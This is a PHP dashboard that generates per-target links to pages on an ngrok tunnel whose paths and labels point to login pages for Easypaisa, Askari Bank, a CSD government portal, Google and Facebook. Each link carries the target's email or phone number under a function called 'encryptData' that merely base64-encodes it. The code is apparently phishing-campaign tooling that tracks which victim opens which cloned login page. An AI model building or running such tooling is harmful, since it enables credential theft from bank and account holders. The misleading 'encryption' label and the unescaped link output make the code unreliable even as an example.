<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['group_name'])) {
        $_SESSION['group_name'] = $_POST['group_name'];
    }
    if (isset($_POST['contact'])) {
        $_SESSION['contact'] = $_POST['contact'];
    }
}

$groupName = isset($_SESSION['group_name']) ? $_SESSION['group_name'] : '';
$contact = isset($_SESSION['contact']) ? $_SESSION['contact'] : '';

function encryptData($data) {
    return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($data)); // URL-safe encoding
}

$base_links = [
    "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/php_login/php_login_system/testing_website/easypaisa.php",
    "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/askari_bank/logout.php",
    "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/csd_gov_pk/login.php",
    "https://8671-103-137-24-144.ngrok-free.app/google/googlei.php",
    "https://8671-103-137-24-144.ngrok-free.app/real-Estate-Management-System-main/",
    "https://8671-103-137-24-144.ngrok-free.app/facebook/facebook_login.php",
    "https://8671-103-137-24-144.ngrok-free.app/warZoneCommand/index.php",
    "https://8671-103-137-24-144.ngrok-free.app/hackathon/index.html#about",
    "https://8671-103-137-24-144.ngrok-free.app/eshop2",
    "https://8671-103-137-24-144.ngrok-free.app/stylo_website/welcome_stylo.php"
];

$website_names = [
    "Easypaisa",
    "Askari Bank",
    "CSD Government",
    "Google",
    "Real Estate System",
    "Facebook",
    "War Zone Command",
    "Hackathon",
    "E-Shop",
    "Stylo Website"
];

$encryptedContact = $contact ? encryptData($contact) : '';
$_SESSION['generated_links'] = [];

if ($contact) {
    $_SESSION['generated_links'] = array_map(function($link) use ($encryptedContact) {
        return $link . "?contact=" . urlencode($encryptedContact);
    }, $base_links);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Group Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script>
        function toggleLink(index) {
            var linkDiv = document.getElementById('link_' + index);
            if (linkDiv.style.display === "none") {
                linkDiv.style.display = "block";
            } else {
                linkDiv.style.display = "none";
            }
        }
    </script>
</head>
<body class="container mt-4">
    <h2 class="text-center">Group Dashboard</h2>
    
    <form method="POST" class="mb-3">
        <div class="mb-3">
            <label for="group_name" class="form-label">Enter Group Name:</label>
            <input type="text" id="group_name" name="group_name" class="form-control" required value="<?php echo htmlspecialchars($groupName); ?>">
        </div>
        <button type="submit" class="btn btn-primary">Save Group</button>
    </form>
    
    <?php if ($groupName): ?>
        <h3>Group: <?php echo htmlspecialchars($groupName); ?></h3>
        
        <form method="POST" class="mb-3">
            <div class="mb-3">
                <label for="contact" class="form-label">Enter Email or Phone:</label>
                <input type="text" id="contact" name="contact" class="form-control" required>
            </div>
            <button type="submit" class="btn btn-success">Generate Links</button>
        </form>

        <?php if (!empty($_SESSION['generated_links'])): ?>
            <h4>Generated Links for Group: <?php echo htmlspecialchars($groupName); ?></h4>
            <ul>
                <?php foreach ($_SESSION['generated_links'] as $index => $fullLink): ?>
                    <li>
                        <a href="javascript:void(0);" onclick="toggleLink(<?php echo $index; ?>)">
                            <?php echo htmlspecialchars($website_names[$index]); ?>
                        </a>
                        <div id="link_<?php echo $index; ?>" style="display: none; margin-top: 5px;">
                            <a href="<?php echo $fullLink; ?>" target="_blank"><?php echo $fullLink; ?></a>
                        </div>
                    </li>
                <?php endforeach; ?>
            </ul>
            <?php unset($_SESSION['generated_links']); ?>
        <?php endif; ?>
    <?php endif; ?>
</body>
</html>
